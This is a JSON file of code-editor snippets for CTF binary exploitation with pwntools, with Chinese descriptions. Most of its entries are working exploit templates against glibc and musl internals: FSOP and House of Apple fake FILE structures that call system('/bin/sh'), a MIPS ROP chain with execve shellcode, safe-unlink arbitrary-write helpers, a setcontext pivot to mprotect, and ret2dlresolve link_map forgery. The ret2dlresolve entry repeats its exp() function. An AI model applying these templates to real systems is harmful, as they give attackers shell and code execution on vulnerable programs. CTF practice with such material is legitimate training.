{
  "musl-fsop": {
    "prefix": "musl",
    "body": [
      "class META_struct:",
      "    BIT_FIELD_BLEN = {",
      "        'last_idx'  : 5,",
      "        'freeable'  : 1,",
      "        'sizeclass' : 6,",
      "        'maplen'    : 52,",
      "    }",
      "",
      "    FIELD_NAME = (",
      "        'prev',",
      "        'next',",
      "        'mem',",
      "        'avail_mask',",
      "        'freed_mask',",
      "        'last_idx',",
      "        'freeable',",
      "        'sizeclass',",
      "        'maplen'",
      "    )",
      "",
      "    def __init__(self):",
      "        self.__data = {}",
      "        for k in self.FIELD_NAME:",
      "            self.__data[k] = 0",
      "",
      "    def __setattr__(self, attr, vaule):",
      "        if attr in self.FIELD_NAME:",
      "            self.__data[attr] = vaule",
      "        else:",
      "            super().__setattr__(attr, vaule)",
      "",
      "    def __getattr__(self, attr):",
      "        if attr in self.FIELD_NAME:",
      "            return self.__data[attr]",
      "        else:",
      "            return super().__getattr__(attr)",
      "",
      "    def __bytes__(self):",
      "        payload = b''",
      "        for k in ('prev', 'next', 'mem'):",
      "            payload += p64(self.__data[k])",
      "        for k in ('avail_mask', 'freed_mask'):",
      "            payload += p32(self.__data[k])",
      "        bv = 0",
      "        bpos = 0",
      "        for k in ('last_idx', 'freeable', 'sizeclass', 'maplen'):",
      "            blen = self.BIT_FIELD_BLEN[k]",
      "            bv |= (self.__data[k] & ((1 << blen) - 1)) << bpos",
      "            bpos += blen",
      "        payload += p64(bv)",
      "        return payload",
      "fake_file_addr = libc.address - 0x4000 + 0x20",
      "fake_file = flat({",
      "    0: b'/bin/sh\\0',",
      "    0x28: 1,",
      "    0x48: libc.sym.system",
      "}, filler=b'\\0').ljust(0x90, b'\\xff') # fill until FILE.lock with -1.",
      "    ",
      "ofl_head_addr = libc.address + 0xe0ee8",
      "fake_objs_addr = fake_file_addr + 0xfe0",
      "fake_meta = META_struct()",
      "fake_meta.prev = fake_file_addr",
      "fake_meta.next = ofl_head_addr",
      "fake_meta.mem = fake_objs_addr + 0x30",
      "fake_meta.freeable = 1",
      "fake_meta.maplen = 1",
      "    ",
      "fake_p2free = fake_objs_addr + 0x40",
      "    ",
      "fsop_payload = flat({",
      "    0: fake_file,",
      "    0xfe0: [",
      "        ctx_secret, # fake_meta_area.check",
      "        bytes(fake_meta),   # fake_meta",
      "        fake_objs_addr + 8, # fake_group.meta",
      "    ]",
      "}).ljust(0x1200, b'\\0')"
    ],
    "description": "Musl libc FSOP Exploit Template"
  },
  "z3-solver": {
    "prefix": "z3sol",
    "body": [
      "from z3 import *",
      "# 创建一个32个整数的列表",
      "flag = [BitVec('flag[%d]' % i, 32) for i in range(32)]",
      "# 创建一个求解器",
      "s = Solver()",
      "# 添加约束条件",
      "s.add(flag[23] * flag[23] == 0)",
      "[s.add(flag[i] < 0x7f, flag[i] >= 20) for i in range(32)]",
      "# 求解",
      "if s.check() == sat:",
      "    m = s.model()",
      "    print(m)",
      "    flag_values = [m.evaluate(flag[i]).as_long() for i in range(32)]",
      "    print('flag:', ''.join(map(chr,flag_values)))",
      "else:",
      "    print('无解')"
    ],
    "description": "Z3 求解器模板"
  },
  "mips-rop": {
    "prefix": "mipsrop",
    "body": [
      "#!/usr/bin/env python3",
      "from pwn import *",
      "context.terminal = ['tmux', 'splitw', '-h']",
      "fname = args.FNAME if args.FNAME else './mips'",
      "exe = ELF(fname)",
      "context.binary = exe",
      "",
      "if args.REMOTE:",
      "    host, port = args.REMOTE.split(':')",
      "    io = remote(host, int(port))",
      "else:",
      "    # io = process(['qemu-mipsel-static', '-L', './mipsel', '-g', '1234', fname])",
      "    io = process(['qemu-mipsel-static', '-L', '/etc/qemu-binfmt/mipsel' ,fname])",
      "",
      "s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter",
      "r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil",
      "",
      "def exp():",
      "    # 0x0040B2A0  |  addiu $a2,$sp,0x44+var_C |  jalr  $s1",
      "    j_s1 = 0x40B2A0",
      "    ",
      "    # .text:004414C8 34 00 BF 8F             lw      $ra, 0x18+var_s1C($sp)",
      "    # .text:004414CC 25 10 00 02             move    $v0, $s0",
      "    # .text:004414D0 30 00 B6 8F             lw      $s6, 0x18+var_s18($sp)",
      "    # .text:004414D4 2C 00 B5 8F             lw      $s5, 0x18+var_s14($sp)",
      "    # .text:004414D8 28 00 B4 8F             lw      $s4, 0x18+var_s10($sp)",
      "    # .text:004414DC 24 00 B3 8F             lw      $s3, 0x18+var_sC($sp)",
      "    # .text:004414E0 20 00 B2 8F             lw      $s2, 0x18+var_s8($sp)",
      "    # .text:004414E4 1C 00 B1 8F             lw      $s1, 0x18+var_s4($sp)",
      "    # .text:004414E8 18 00 B0 8F             lw      $s0, 0x18+var_s0($sp)",
      "    # .text:004414EC 08 00 E0 03             jr      $ra",
      "    # .text:004414F0 38 00 BD 27             addiu   $sp, 0x38",
      "    set_s1 = 0x4414c8",
      "    ",
      "    # 0x0041FBF4  |  move $t9,$a2 |  jr      $a2    ",
      "    j_a2 = 0x41FBF4",
      "    ",
      "    padlen = 0x60 - 0x18",
      "    ra_off = 0x5c - 0x18",
      "    payload = flat({",
      "        ra_off: set_s1,",
      "        padlen: {",
      "            0x18+0x4: j_a2, # $s1",
      "            0x18+0x1c: j_s1, # $ra",
      "            0x38+0x38: asm(shellcraft.execve(b'/bin/sh'))",
      "        }",
      "    })",
      "    io.send(payload)",
      "    ",
      "if '__main__' == __name__:",
      "    if args.DEBUG:",
      "        context.log_level='debug'",
      "    exp()",
      "    io.interactive()"
    ],
    "description": "MIPS ROP 模板"
  },
  "house of apple magic gadget for ORW": {
    "prefix": "hoa_orw",
    "body": [
      "# 16a06a:       48 8b 6f 48          mov     rbp,QWORD PTR [rdi+0x48]",
      "# 16a06e:       48 8b 45 18          mov     rax,QWORD PTR [rbp+0x18]",
      "# 16a072:       4c 8d 6d 10          lea     r13,[rbp+0x10]",
      "# 16a076:       c7 45 10 00 00 00 00 mov     DWORD PTR [rbp+0x10],0x0",
      "# 16a07d:       4c 89 ef             mov     rdi,r13",
      "# 16a080:       ff 50 28             call    QWORD PTR [rax+0x28]",
      "magic_gadget = libc.address + 0x16a06a"
    ],
    "description": "House of Apple ROP gadget for ORW"
  },
  "safe-unlink": {
    "prefix": "unlink",
    "body": [
      "addr_global_tbl = 0x602120",
      "fake_chunk_ptr = addr_global_tbl",
      "fake_fd = fake_chunk_ptr - 0x18",
      "fake_bk = fake_chunk_ptr - 0x10",
      "payload_unlink = flat({",
      "    0x8:     0x1f1,",
      "    0x10:    fake_fd,",
      "    0x18:    fake_bk,",
      "    0x1f0:   0x1f0   # nextchunk.prev_size",
      "})",
      "# now the *fake_chunk_ptr = fake_chunk_ptr - 0x18",
      "def write_to(addr, val):",
      "    payload_write = flat({",
      "        0x0:     0x1f8,",
      "        0x8:   addr,",
      "    })",
      "    edit(8, len(payload_write), payload_write)",
      "    edit(7, 0x10, p64(val))"
    ],
    "description": "Safe Unlink 模板"
  },
  "call by csu_init": {
    "prefix": "csu_init",
    "body": [
      "def call_by_csu_init(fn_got, arg0, arg1, arg2):",
      "    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;",
      "    addr_pop6 = 0x40070A",
      "    # mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12+rbx*8]; add rbx, 1; cmp rbx, rbp; jnz ...;",
      "    # add rsp, 8; pop * 6; ret",
      "    addr_call_arg3 = 0x4006F0",
      "    payload = flat([",
      "        addr_pop6, 0, 1, fn_got, arg2, arg1, arg0,",
      "        addr_call_arg3, [0]*7   # paddings",
      "    ])",
      "    return payload"
    ],
    "description": "csu_init ROP 模板"
  },
  "house-of-apple fake FILE": {
    "prefix": "hoa",
    "body": [
      "fake_FILE_addr = heap_base + 0x2b0",
      "_wide_data = fake_FILE_addr + 8",
      "_wide_vtable = _wide_data + 0xe0 - 0x60",
      "# Calling chain: ",
      "# exit()",
      "#   |-- _IO_flush_all_lockp()",
      "#       |-- _IO_OVERFLOW(fp) ==> _IO_wfile_jumps.__overflow()",
      "#           |-- _IO_wdoallocbuf(fp) ==> fp->_wide_data->_wide_table->__doallocate: offset +0x68 from vtable",
      "# Requirements:",
      "#   _flags &= ~(2|8|0x800)",
      "#   mode > 0",
      "#   _wide_data->_IO_write_base = 0",
      "#   _wide_data->_IO_write_ptr > _wide_data->_IO_write_base",
      "#   _wide_data->_IO_buf_base = 0",
      "#   fp->_vtable_offset = 0",
      "fake_FILE = flat([",
      "    b'  sh'.ljust(8, b'\\0'), # _flags &= ~(2|8|0x800), u64(b'  sh')==0x68732020",
      "    0, 0, 0, # _IO_read_ptr, _IO_read_end, _IO_read_base",
      "    0, # _IO_write_base",
      "    1, # RDX = _IO_write_ptr,",
      "    2, # _IO_write_end",
      "    [0] * 6, ",
      "    0, # +0x68, _chain",
      "    [0] * 6, ",
      "    _wide_data, # +0xa0: _wide_data = fake_FILE+8",
      "    [0] * 3, ",
      "    1, # +0xc0: _mode",
      "    [0] * 2, ",
      "    libc.sym._IO_wfile_jumps, # +0xd8: RAX = _vtable",
      "    # fake_FILE end, but fake_IO_wide_data still have some members.",
      "    0,",
      "    _wide_vtable,   # +0xe8 == fake_wide_data + 0xe0, _wide_vtable",
      "    libc.sym.system,      # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__doallocate",
      "])",
      "",
      "edit(0, b'\\0'*0x58 + p64(fake_FILE_addr)) # set _IO_list_all->_chain",
      "edit(1, fake_FILE)",
      "    "
    ],
    "description": "House of Apple fake FILE 模板"
  },
  "build ucontext_t obj": {
    "prefix": "ucontext",
    "body": [
      "# 54f5d:       48 8b a2 a0 00 00 00    mov     0xa0(%rdx),%rsp",
      "# 54f64:       48 8b 9a 80 00 00 00    mov     0x80(%rdx),%rbx",
      "# 54f6b:       48 8b 6a 78             mov     0x78(%rdx),%rbp",
      "# 54f6f:       4c 8b 62 48             mov     0x48(%rdx),%r12",
      "# 54f73:       4c 8b 6a 50             mov     0x50(%rdx),%r13",
      "# 54f77:       4c 8b 72 58             mov     0x58(%rdx),%r14",
      "# 54f7b:       4c 8b 7a 60             mov     0x60(%rdx),%r15",
      "setcontext_61_addr = libc.sym['setcontext'] + 61",
      "",
      "# libc >= 2.29 rdi -> rdx",
      "# 0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]",
      "pat = b'H\\x8bW\\x08H\\x89\\x04$\\xffR '",
      "rdi2rdx_call = next(libc.search(pat))   # search by pattern instead of using a explicit offset",
      "ucontext = flat({",
      "    0x28: 0,           # +0x28: r8",
      "    0x30: 0,           # +0x30: r9",
      "    0x48: 0,           # +0x48: r12",
      "    0x50: 0,           # +0x50: r13",
      "    0x58: 0,           # +0x58: r14",
      "    0x60: 0,           # +0x60: r15",
      "    0x68: heap_base,   # +0x68: rdi",
      "    0x70: 0x21000,     # +0x70: rsi",
      "    0x78: 0,           # +0x78: rbp",
      "    0x80: 0,           # +0x80: rbx",
      "    0x88: 7,           # +0x88: rdx",
      "    0x98: 0,           # +0x98: rcx",
      "    0xa0: addr_rop,    # +0xa0: rsp",
      "    0xa8: mprotect     # +0xa8: rip",
      "})",
      "assert(len(ucontext) == 0xb0)"
    ],
    "description": "ucontext_t 对象构建模板"
  },
  "ret2dlresolve x64 template": {
    "prefix": "ret2dl",
    "body": [
      "# ret2dl-resolve_x64:",
      "# Requirements:",
      "#   - sym->st_other |= 0x3;",
      "#   - value = l->l_addr + sym->st_value; // value to be the target function address.",
      "#       - l->l_addr = target_func_addr - resolved_func_addr;",
      "#       - sym->st_value = resolved_func_addr;",
      "#           - sym = got_of_resolved_func - offset(st_value)",
      "#                 = got_of_resolved_func - 8",
      "#       - rel_addr = any_writable_addr; // *rel_addr = value;",
      "#                 = l->addr + reloc->r_offset;",
      "#   ",
      "def forgeLinkMap(addr_linkmap, l_addr, got_of_resolved_func, reloc_arg):",
      "    log.debug('Fake linkmap object at %#x, l_addr=%#x, sym@%#x\\n', addr_linkmap, l_addr, got_of_resolved_func)",
      "    addr_Elf_Dyn_strtab = addr_linkmap # Any readable address is OK.",
      "    addr_Elf_Dyn_symtab = addr_linkmap + 8",
      "    addr_Elf_Dyn_jmprel = addr_Elf_Dyn_symtab + 0x10 ",
      "    addr_Elf_Rela = addr_Elf_Dyn_jmprel + 0x10",
      "    log.debug('DT_STRTAB at %#x\\n\\tDT_SYMTAB at %#x\\n\\tDT_JMPREL at %#x\\n\\tElf64_Rela object at %#x\\n'",
      "        , addr_Elf_Dyn_strtab",
      "        , addr_Elf_Dyn_symtab",
      "        , addr_Elf_Dyn_jmprel",
      "        , addr_Elf_Rela",
      "    )",
      "    Elf_Dyn_symtab = [0, got_of_resolved_func - 8]",
      "",
      "    # In sysdeps/x86_64/dl-runtime.c:",
      "    # #define reloc_offset reloc_arg * sizeof (PLTREL)",
      "    # #define reloc_index  reloc_arg",
      "    # ",
      "    # 32-bit: reloc_offset <=> reloc_arg",
      "    # 64-bit: reloc_offset = reloc_arg * sizeof(Elf64_Rela) = reloc_arg * 24",
      "    # ",
      "    Elf_Dyn_jmprel = [0, addr_Elf_Rela - 24*reloc_arg]",
      "    ",
      "    r_offset = addr_Elf_Dyn_symtab - l_addr ",
      "    Elf_Rela_obj = [",
      "        r_offset, # r_offset, Any writable address is OK.",
      "        7, # r_info = (sym_idx << 32) | sym_type",
      "        0, # r_addend",
      "    ]",
      "    log.debug('Fake Elf_Rela:\\n\\tr_offset=%x\\n', r_offset)",
      "    addr_binsh = addr_linkmap + 0x78",
      "    fake_linkmap = flat({",
      "        0: [l_addr, ",
      "            Elf_Dyn_symtab, # +0x08",
      "            Elf_Dyn_jmprel, # +0x18 ",
      "            Elf_Rela_obj,   # +0x28",
      "        ], ",
      "        0x68:[",
      "            addr_Elf_Dyn_strtab,    # +0x68: l_info[DT_STRTAB] ==> l_info[5]",
      "            addr_Elf_Dyn_symtab,    # +0x70: l_info[DT_SYMTAB] ==> l_info[6]",
      "            b'/bin/sh\\0'            # +0x78",
      "        ], ",
      "        0xf8: addr_Elf_Dyn_jmprel   # 0xf8: l_info[DT_JMPREL] ==> l_info[23]",
      "    })    ",
      "    return fake_linkmap, addr_binsh",
      "",
      "def exp():",
      "    prdi = 0x40115E",
      "    prsi = 0x40116B",
      "    ret = prdi + 1",
      "    got_setbuf = exe.got.setbuf",
      "    reloc_arg = 0",
      "    addr_linkmap = exe.bss()",
      "    l_addr = libc.sym.system - libc.sym.setbuf",
      "    fake_linkmap, addr_binsh = forgeLinkMap(addr_linkmap, l_addr, got_setbuf, reloc_arg)",
      "    dlfixup_trampol = 0x401026",
      "    payload = flat({0x78:[",
      "        prdi, 0, prsi, addr_linkmap, exe.plt.read, ",
      "        prdi, addr_binsh, dlfixup_trampol, addr_linkmap, reloc_arg,",
      "    ]})",
      "",
      "    s(payload)",
      "    # bpt()",
      "    s(fake_linkmap)",
      "def exp():",
      "    prdi = 0x40115E",
      "    prsi = 0x40116B",
      "    ret = prdi + 1",
      "    got_setbuf = exe.got.setbuf",
      "    reloc_arg = 0",
      "    addr_linkmap = exe.bss()",
      "    l_addr = libc.sym.system - libc.sym.setbuf",
      "    fake_linkmap, addr_binsh = forgeLinkMap(addr_linkmap, l_addr, got_setbuf, reloc_arg)",
      "    dlfixup_trampol = 0x401026",
      "    payload = flat({0x78:[",
      "        prdi, 0, prsi, addr_linkmap, exe.plt.read, ",
      "        prdi, addr_binsh, dlfixup_trampol, addr_linkmap, reloc_arg,",
      "    ]})",
      "",
      "    s(payload)",
      "    # bpt()",
      "    s(fake_linkmap)",
      ""
    ],
    "description": "ret2dl-resolve 64 位模板"
  },
  "create io": {
    "prefix": "gio",
    "body": [
      "if args.REMOTE:",
      "    host, port = args.REMOTE.split(':')",
      "    io = remote(host, int(port))",
      "else:",
      "    io = process(${1:f_name})"
    ],
    "description": "创建 pwntools IO 对象"
  },
  "main entry": {
    "prefix": "main",
    "body": [
      "if '__main__' == __name__:",
      "    if args.DEBUG:",
      "        context.log_level='debug'",
      "    exp()",
      "    io.interactive()"
    ],
    "description": "Python 主入口点和交互模式"
  },
  "pwntools header": {
    "prefix": "pwn",
    "body": [
      "#!/usr/bin/env python3",
      "from pwn import *",
      "context(os=${1:'linux'}, arch=${2:'i386'}, kernel=${3:'amd64'})",
      "context.terminal = ['tmux', 'splitw', '-h']",
      "fname = args.FNAME if args.FNAME else ${4:'./pwn'}",
      "exe = ELF(fname)",
      "context.binary = exe",
      "",
      "DEFAULT_LIB = {'i386':'/lib/i386-linux-gnu/libc.so.6', 'amd64':'/lib/x86_64-linux-gnu/libc.so.6'}",
      "DEFAULT_LDSO = {'i386':'/lib/i386-linux-gnu/ld-linux.so.2', 'amd64':'/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'}",
      "libname = args.LIB if args.LIB else DEFAULT_LIB[context.arch]",
      "ldname = args.LDSO if args.LDSO else DEFAULT_LDSO[context.arch]",
      "libc = ELF(libname)",
      "ldso = ELF(ldname)",
      "",
      "if args.REMOTE:",
      "    host, port = args.REMOTE.split(':')",
      "    io = remote(host, int(port))",
      "elif args.LDSO:",
      "    io = process([ldname, fname], env={'LD_PRELOAD': libname})",
      "elif args.LIB:",
      "    io = process(fname, env={'LD_PRELOAD': libname})",
      "else:",
      "    io = process(fname)",
      "",
      "def bpt():",
      "    if not args.REMOTE:",
      "        gdb.attach(io)",
      "    pause()",
      "",
      "def pid_pause():",
      "    if not args.REMOTE:",
      "        log.info('PID: %d' % io.proc.pid)",
      "    pause()",
      "",
      "s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter",
      "r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil",
      "",
      "def opt(idx):",
      "    sa(b'', str(idx).encode())",
      "",
      "def add(sz, content):",
      "    opt()",
      "    sa(b'', str(sz).encode())",
      "    sa(b'', content)",
      "",
      "def edit(idx, content):",
      "    opt()",
      "    sa(b'', str(idx).encode())",
      "    sa(b'', content)",
      "",
      "def show(idx):",
      "    opt()",
      "    sa(b'', str(idx).encode())",
      "",
      "def delete(idx):",
      "    opt()",
      "    sa(b'', str(idx).encode())",
      "",
      "def exp():",
      "    pass",
      "",
      "if '__main__' == __name__:",
      "    if args.DEBUG:",
      "        context.log_level='debug'",
      "    exp()",
      "    io.interactive()"
    ],
    "description": "pwntools 完整模板"
  },
  "pwn log level": {
    "prefix": "log_level",
    "body": [
      "context.log_level=${1:'debug'}"
    ],
    "description": "设置 pwntools 日志级别"
  },
  "pwn info log": {
    "prefix": "pinfo",
    "body": [
      "log.info(f'===========> $1')"
    ],
    "description": "pwntools info 级别日志"
  },
  "pwn debug log": {
    "prefix": "pdbg",
    "body": [
      "log.debug(f'===========> $1')"
    ],
    "description": "pwntools debug 级别日志"
  },
  "pwn success log": {
    "prefix": "psuc",
    "body": [
      "log.success(f'===========> $1')"
    ],
    "description": "pwntools success 级别日志"
  },
  "pwn io abbreviations": {
    "prefix": "abio",
    "body": [
      "s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter",
      "r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil"
    ],
    "description": "pwntools IO 缩写"
  },
  "pwn io send": {
    "prefix": "s",
    "body": [
      "send(${1:payload})"
    ],
    "description": "pwntools send"
  },
  "pwn io send after": {
    "prefix": "sa",
    "body": [
      "sendafter(${1:payload})"
    ],
    "description": "pwntools sendafter"
  },
  "pwn io send a line": {
    "prefix": "sl",
    "body": [
      "sendline(${1:payload})"
    ],
    "description": "pwntools sendline"
  },
  "pwn io send line after": {
    "prefix": "sla",
    "body": [
      "sendlineafter(${1:payload})"
    ],
    "description": "pwntools sendlineafter"
  },
  "pwn io receive": {
    "prefix": "r",
    "body": [
      "recv"
    ],
    "description": "pwntools recv"
  },
  "pwn io receive until": {
    "prefix": "ru",
    "body": [
      "recvuntil(${1:pattern}, drop=${2:False})"
    ],
    "description": "pwntools recvuntil"
  },
  "pwn io receive a line": {
    "prefix": "rl",
    "body": [
      "recvline()"
    ],
    "description": "pwntools recvline"
  },
  "pwn io receive all": {
    "prefix": "ra",
    "body": [
      "recvall()"
    ],
    "description": "pwntools recvall"
  },
  "pwn exec file name": {
    "prefix": "fname",
    "body": [
      "fname = args.FNAME if args.FNAME else './syscall_interface'"
    ],
    "description": "pwntools 可执行文件名"
  },
  "pwn libc file name": {
    "prefix": "libcname",
    "body": [
      "libcname = args.LIBC if args.LIBC else '/lib/x86_64-linux-gnu/libc.so.6'"
    ],
    "description": "pwntools libc 文件名"
  }
}